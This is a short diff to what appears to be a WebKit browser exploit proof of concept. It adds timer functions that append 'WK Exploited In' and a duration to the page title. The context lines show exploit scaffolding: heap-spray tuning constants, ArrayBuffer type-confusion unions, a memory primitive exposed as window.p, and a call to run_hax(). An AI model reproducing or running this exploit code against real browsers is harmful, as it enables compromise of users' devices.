@@ -10,7 +10,7 @@ var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
-
+    StartTimer();
     var union = new ArrayBuffer(8);
     var union_b = new Uint8Array(union);
     var union_i = new Uint32Array(union);
@@ -458,6 +458,15 @@ function poc() {
             return new int64(obj_master[4], obj_master[5]);
         }
     };
+    
     window.p = prim;
+    EndTimer();
     run_hax();
 }
+
+function CalcTime(dur){hrs=Math.floor(dur/1000/60/60);min=Math.floor(dur/1000/60-hrs*60);sec=Math.floor(dur/1000-min*60);mil=dur.toString().slice(-3);if (min!=0){ShowDuration=" - WK Exploited In : "+min+" minute"+(min==1?"":"s")+", "+sec+" second"+(sec==1?"":"s");}else {ShowDuration=" - WK Exploited In: "+sec+" second"+(sec==1?"":"s");}}
+function StartTimer(){StartTime=Date.now();}
+function EndTimer(){EndTime=Date.now();CalcTime(EndTime=Date.now()-StartTime);document.title+=ShowDuration;}
+
+
+
